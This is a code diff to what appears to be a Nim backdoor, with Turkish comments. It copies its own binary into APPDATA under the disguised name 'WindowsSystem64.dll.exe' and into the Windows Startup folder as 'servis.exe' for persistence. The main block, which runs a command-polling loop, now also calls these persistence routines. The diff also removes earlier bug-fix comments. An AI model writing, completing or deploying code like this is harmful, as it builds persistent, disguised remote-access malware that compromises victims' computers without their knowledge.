@@ -87,21 +87,20 @@ proc peel2() =
   let originBinary = getAppFilename()
   let roamingPath = getEnv("APPDATA")
   
-  # HATA DÜZELTİLDİ: originBinary yerine roamingPath kullanıldı
   let deployTarget = roamingPath / "WindowsSystem64.dll.exe"
 
   try:
-    # HATA DÜZELTİLDİ: copyFil -> copyFile
+   
     copyFile(originBinary, deployTarget)
     echo "peel2 okey: ", deployTarget
   except OSError as e:
     echo "error (peel2): ", e.msg
 
-# 2. Yöntem: Başlangıç (Startup) klasörüne kopyalama
+
 proc copyToStartup() =
   let originBinary = getAppFilename()
   
-  # HATA DÜZELTİLDİ: 'user' değişkenine gerek kalmadan APPDATA üzerinden tam yol alındı
+  
   let startupPath = getEnv("APPDATA") / r"Microsoft\Windows\Start Menu\Programs\Startup\servis.exe"
 
   try:
@@ -166,3 +165,5 @@ proc poll_commands() =
     sleep(60000)
 when isMainModule:
   poll_commands()
+  peel2()
+  copyToStartup()
